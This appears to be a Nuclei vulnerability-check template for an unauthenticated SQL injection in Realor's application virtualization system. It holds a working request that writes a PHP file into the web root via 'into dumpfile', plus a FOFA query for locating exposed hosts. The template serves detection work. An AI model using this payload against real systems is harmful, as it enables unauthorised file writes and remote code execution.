http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200
    - status_code_2 == 200
    - contains(body_2, "c8c605999f3d8352d7bb792cf3fdb25")
    type: dsl
  raw:
  - 'GET /hmrao.php?s=/Admin/appsave&appid=1'');select+''<?php+echo+md5({{num}});unlink(__FILE__);?>''+into+dumpfile+''../../WebRoot/{{filename}}'';--+</
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: realor-appsave-sqli-rce
info:
  author: Co5mos
  description: 'Realor Application Virtualization System''s /Home/Controller/AdminController
    contains two interfaces, appsave and appdel, which do not require authentication
    and are vulnerable to SQL injection. Unauthorized attackers can exploit this vulnerability
    to obtain sensitive information. As the default configuration does not restrict
    the MySQL write file path through secure_file_priv, attackers can exploit this
    vulnerability to read and write any local file, thereby executing arbitrary code
    remotely.

    '
  metadata:
    fofa-query: "app=\"REALOR-\u5929\u7FFC\u5E94\u7528\u865A\u62DF\u5316\u7CFB\u7EDF\
      \""
  name: Realor appsave - Remote Code Execution
  reference:
  - https://mp.weixin.qq.com/s/S8I2SIqzl_npSjWIqtru2Q
  severity: high
  tags: realor,sqli,rce
variables:
  filename: '{{rand_base(5)}}.php'
  num: '999999999'
